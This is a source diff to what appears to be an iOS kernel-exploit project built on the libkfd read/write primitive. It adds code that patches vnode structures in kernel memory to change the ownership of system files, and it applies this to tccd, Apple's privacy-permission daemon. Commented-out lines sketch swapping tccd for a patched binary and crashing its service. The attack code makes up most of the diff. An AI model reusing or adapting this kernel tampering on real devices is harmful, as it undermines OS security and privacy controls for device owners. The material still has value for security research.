@@ -7,6 +7,10 @@
 
 #include "fun.h"
 #include "libkfd.h"
+#include "helpers.h"
+#include <sys/stat.h>
+#import <Foundation/Foundation.h>
+#import <UIKit/UIKit.h>
 
 uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
 {
@@ -237,6 +241,47 @@ uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
     return 0;
 }
 
+uint64_t funVnodeChown(u64 kfd, char* filename, uid_t uid, gid_t gid) {
+    uint32_t off_p_pfd = 0xf8;
+    uint32_t off_vnode_v_data = 0xe0;
+    uint32_t off_fp_fglob = 0x10;
+    uint32_t off_fg_data = 0x38;
+    
+    int file_index = open(filename, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    uint64_t proc = getProc(kfd, getpid());
+    
+    //get vnode
+    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
+    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
+    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
+    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t vnode = vnode_pac | 0xffffff8000000000;
+    uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
+    uint32_t v_uid = kread32(kfd, v_data + 0x80);
+    uint32_t v_gid = kread32(kfd, v_data + 0x84);
+    
+    //vnode->v_data->uid
+    printf("[i] Patching %s vnode->v_uid %d -> %d\n", filename, v_uid, uid);
+    kwrite32(kfd, v_data+0x80, uid);
+    //vnode->v_data->gid
+    printf("[i] Patching %s vnode->v_gid %d -> %d\n", filename, v_gid, gid);
+    kwrite32(kfd, v_data+0x84, gid);
+    
+    close(file_index);
+    
+    struct stat file_stat;
+    if(stat(filename, &file_stat) == 0) {
+        printf("[i] %s UID: %d\n", filename, file_stat.st_uid);
+        printf("[i] %s GID: %d\n", filename, file_stat.st_gid);
+    }
+    
+    return 0;
+}
+
 uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
     //16.1.2 offsets
     uint32_t off_p_pfd = 0xf8;
@@ -251,6 +296,11 @@ uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
     uint32_t off_vnode_v_kusecount = 0x5c;
     uint32_t off_vnode_v_references = 0x5b;
     uint32_t off_vnode_v_parent = 0xc0;
+    uint32_t off_vnode_v_label = 0xe8;
+    uint32_t off_vnode_v_cred = 0x98;
+    uint32_t off_mount_mnt_data = 0x11F;
+    uint32_t off_mount_mnt_fsowner = 0x9c0;
+    uint32_t off_mount_mnt_fsgroup = 0x9c4;
     
     int file_index = open(to, O_RDONLY);
     if (file_index == -1) return -1;
@@ -270,6 +320,8 @@ uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
     printf("[i] %s to_vnode->v_mount: 0x%llx\n", to, to_v_mount);
     uint64_t to_v_data = kread64(kfd, to_vnode + off_vnode_v_data);
     printf("[i] %s to_vnode->v_data: 0x%llx\n", from, to_v_data);
+    uint64_t to_v_label = kread64(kfd, to_vnode + off_vnode_v_label);
+    printf("[i] %s to_vnode->v_label: 0x%llx\n", to, to_v_label);
     
     uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
     printf("[i] %s to_vnode->v_references: %d\n", to, to_v_references);
@@ -300,6 +352,17 @@ uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
     printf("[i] %s to_vnode->v_defer_reclaimlist: 0x%llx\n", to, to_v_defer_reclaimlist);
     uint32_t to_v_listflag = kread32(kfd, to_vnode + 0x50);    //v_listflag
     printf("[i] %s to_vnode->v_listflag: 0x%x\n", to, to_v_listflag);
+    uint64_t to_v_cred_pac = kread64(kfd, to_vnode + off_vnode_v_cred);
+    uint64_t to_v_cred = to_v_cred_pac | 0xffffff8000000000;
+    printf("[i] %s to_vnode->v_cred: 0x%llx\n", to, to_v_cred);
+    
+    uint32_t to_m_fsowner = kread32(kfd, to_v_mount + off_mount_mnt_fsowner);
+    printf("[i] %s to_vnode->v_mount->mnt_fsowner: %d\n", to, to_m_fsowner);
+    uint32_t to_m_fsgroup = kread32(kfd, to_v_mount + off_mount_mnt_fsgroup);
+    printf("[i] %s to_vnode->v_mount->mnt_fsgroup: %d\n", to, to_m_fsgroup);
+    
+    uint64_t to_fd_vnode = kread64(kfd, to_v_data + 0x8);
+    printf("[i] %s to_vnode->v_data->fd_vnode: 0x%llx\n", to, to_fd_vnode);
     
     close(file_index);
     
@@ -321,6 +384,8 @@ uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
     printf("[i] %s from_vnode->v_mount: 0x%llx\n", from, from_v_mount);
     uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
     printf("[i] %s from_vnode->v_data: 0x%llx\n", from, from_v_data);
+    uint64_t from_v_label = kread64(kfd, from_vnode + off_vnode_v_label);
+    printf("[i] %s from_vnode->v_label: 0x%llx\n", from, from_v_label);
     uint8_t from_v_references = kread8(kfd, from_vnode + off_vnode_v_references);
     printf("[i] %s from_vnode->v_references: %d\n", from, from_v_references);
     uint32_t from_usecount = kread32(kfd, from_vnode + off_vnode_usecount);
@@ -350,17 +415,62 @@ uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
     printf("[i] %s from_vnode->v_defer_reclaimlist: 0x%llx\n", from, from_v_defer_reclaimlist);
     uint32_t from_v_listflag = kread32(kfd, from_vnode + 0x50);    //v_listflag
     printf("[i] %s from_vnode->v_listflag: 0x%x\n", from, from_v_listflag);
+    uint64_t from_v_cred_pac = kread64(kfd, from_vnode + off_vnode_v_cred);
+    uint64_t from_v_cred = from_v_cred_pac | 0xffffff8000000000;
+    printf("[i] %s from_vnode->v_cred: 0x%llx\n", from, from_v_cred);
+
+    uint32_t from_m_fsowner = kread32(kfd, from_v_mount + off_mount_mnt_fsowner);
+    printf("[i] %s from_vnode->v_mount->mnt_fsowner: %d\n", from, from_m_fsowner);
+    uint32_t from_m_fsgroup = kread32(kfd, from_v_mount + off_mount_mnt_fsgroup);
+    printf("[i] %s from_vnode->v_mount->mnt_fsgroup: %d\n", from, from_m_fsgroup);
+    
+//    kwrite32(kfd, from_v_data+0x80, 0);
+//    kwrite32(kfd, from_v_data+0x84, 0);
+////
+//    //v_data = (struct apfs_fsnode, closed-source...)
+//    //    from_fd_vnode = kread64(kfd, from_v_data + 32);
+////    printf("[i] vnode, %s from_vnode->v_data->fd_vnode: 0x%llx\n", from, from_fd_vnode);// <- vnode
+//
+//    for (int i=0; i<200; i++) {
+//        printf("[i] from_vnode->v_data + 0x%x: 0x%llx\n", i*8, kread64(kfd, from_v_data+i*8));
+//    }
+//
+//    int i = 0x80;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
+//    i += 1;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
+//    i += 1;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
+//    i += 1;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
+//    i += 1;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
+//    i += 1;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
+//    i += 1;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
+//    i += 1;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
+//    i += 1;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
+//    i += 1;
+//    printf("[i] from_vnode->v_data + 0x%x: %d\n", i, kread32(kfd, from_v_data+i));
     
     
+    sleep(2);
     
-//    sleep(2);
-    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
-//    kwrite32(kfd, to_vnode + off_vnode_iocount, to_iocount + 1);
+//    kwrite32(kfd, from_v_mount + off_mount_mnt_fsowner, 0);
+//    kwrite32(kfd, from_v_mount + off_mount_mnt_fsgroup, 0);
     
-    kwrite32(kfd, to_vnode + off_vnode_usecount, from_usecount + 1);
-    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, from_v_kusecount + 1);
-    kwrite8(kfd, to_vnode + off_vnode_v_references, from_v_references + 1);
+//    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
     
+//    kwrite64(kfd, to_v_data + 0x8, from_fd_vnode);
+//
+//    kwrite32(kfd, to_vnode + off_vnode_usecount, from_usecount + 1);
+//    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, from_v_kusecount + 1);
+//    kwrite8(kfd, to_vnode + off_vnode_v_references, from_v_references + 1);
+    
+    //    kwrite32(kfd, to_vnode + off_vnode_iocount, to_iocount + 1);
 //    kwrite64(kfd, to_vnode + 0x10, from_v_freelist_tqe_next);
 //    kwrite64(kfd, to_vnode + 0x18, from_v_freelist_tqe_prev);
 //    kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
@@ -446,16 +556,24 @@ int do_fun(u64 kfd) {
     funProc(kfd, selfProc);
     funVnode(kfd, selfProc, "/System/Library/Audio/UISounds/photoShutter.caf");
     funCSFlags(kfd, "launchd");
-
-    funTask(kfd, "launchd");
     funTask(kfd, "kfd");
-    funTask(kfd, "SpringBoard");
-    funTask(kfd, "amfid");
-    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");
-
-//    printf("UID: %d\n", getuid());
     
-//    escapeSandboxForProcess(kfd, selfProc);
+    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
+    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
+    
+//    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);
+
+
+//Overwrite tccd:
+//    NSString *copyToAppDocs = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd_patched.bin"];
+//    remove(copyToAppDocs.UTF8String);
+//    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/tccd_patched.bin"] toPath:copyToAppDocs error:nil];
+//    chmod(copyToAppDocs.UTF8String, 0755);
+//    funVnodeOverwrite(kfd, selfProc, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", [copyToAppDocs UTF8String]);
+    
+//    xpc_crasher("com.apple.tccd");
+//    xpc_crasher("com.apple.tccd");
+
     
     return 0;
 }
